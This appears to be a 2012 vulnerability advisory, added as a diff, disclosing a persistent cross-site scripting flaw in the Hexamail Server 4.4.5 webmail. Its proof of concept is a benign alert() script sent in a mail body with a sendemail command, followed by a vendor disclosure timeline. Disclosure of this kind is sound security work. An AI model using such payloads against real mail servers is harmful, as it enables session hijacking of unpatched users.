@@ -1,0 +1,59 @@
+#Title: Hexamail Server <= 4.4.5 Persistent XSS Vulnerability
+#Date: June 3, 2012
+#Author: modpr0be[at]Spentera, @modpr0be
+#URL: http://www.spentera.com
+#Software URL:http://www.hexamail.com/download/hexamailserversetup4.4.5.002.exe
+#Tested on
+#       OS: Windows XP SP3, Windows 2003 SP2, Windows 7 SP1
+#       Browser: Chrome 19.0.x, IE9, Safari 5.1.7
+
+Software Description
+====================
+Hexamail provides intelligent email software solutions. Leveraging the latest 
+advanced techniques, such as Bayesian matching, our products enable customers 
+to eliminate email intrusions such as spam, malware, spyware, phishing attacks 
+and virus.
+
+Vulnerability Description
+=========================
+Hexamail Server suffers persistent XSS vulnerability in the mail body, allowing 
+malicious user to execute scripts in a victim’s browser to hijack user sessions, 
+redirect users, and or hijack the user’s browser.
+
+Proof of concept
+================
+By sending a malicious script to the victim email, the webmail automatically 
+load the mail body, so the script will be automatically executed without permission 
+from user.
+
+root@bt:~/# cat > meal.txt
+<html>
+<body>
+<h1>XSS pop up</h1>
+<script>alert('Hi, what is this?');</script>
+</body>
+</html>
+root@bt:~/#
+
+Send email to the victim:
+root@bt:~/# sendemail -f bob@example.com -t david@example.com -xu bob@example.com \
+-xp bob123 -u "Want some meal..?" -o message-file=meal.txt -s mail.example.com
+
+Vendor timeline
+===============
+04/20/2012 - Issue discovered
+04/20/2012 - Vendor contacted
+04/27/2012 - Vendor respond and provides new upgrade version
+04/30/2012 - Issue still affected on the latest upgrade version
+04/30/2012 - Vendor said they still fixing the problem
+05/10/2012 - Email sent to ask about the fix progress
+06/02/2012 - No response. Advisory published.
+
+Solution
+============
+Not available.
+
+References
+============
+http://www.hexamail.com
+http://www.spentera.com/2012/06/hexamail-server-4-4-5-persistent-xss-vulnerability/
